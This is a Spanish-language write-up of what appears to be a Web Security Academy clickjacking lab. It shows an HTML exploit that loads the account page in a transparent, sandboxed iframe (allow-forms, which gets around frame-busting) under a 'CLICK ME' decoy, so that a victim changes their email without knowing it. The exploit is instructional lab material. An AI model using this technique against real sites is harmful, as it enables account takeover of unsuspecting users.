
## Objetivo:

![[Pasted image 20240609205931.png]]

## Solucion:

Iniciamos sesion con nuestro usuario e intentamos llenar el input de email por url a ver si funciona y vemos que si...

![[Pasted image 20240609210419.png]]

Entonces con esto ya tenemos una ruta para colocarla en el iframe... Como vemos tenemos un puede cargar el iframe

![[Pasted image 20240609210517.png]]

Para bypassear esto hay que usar el atributo "sandbox" en iframe y agregarle la opcion "allow-forms" que al hacer esto nos permitirá enviar formularios...

El "exploit" quedaria de la siguiente manera

```
<!DOCTYPE html>

<html lang="en">

<head>

<meta charset="UTF-8">

<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Document</title>

  

<style>

iframe {

width: 1000px;

height: 700px;

z-index: 2;

position: relative;

opacity: 0.2;

}

  

div {

position: absolute;

z-index: 1;

top: 465px;

left: 50px;

}

  

</style>

</head>

<body>

<div>CLICK ME</div>

<iframe src="https://0a0d00d40434184a80184e4700d8002a.web-security-academy.net/my-account?email=pwned@mail.com" sandbox="allow-forms"></iframe>

</body>

</html>

```


Luego repetimos lo mismo de los laboratorios anteriores, cambiamos el "opacity" del iframe a 0.000001 lo guardamos y enviamos a la victima...


![[Pasted image 20240609210847.png]]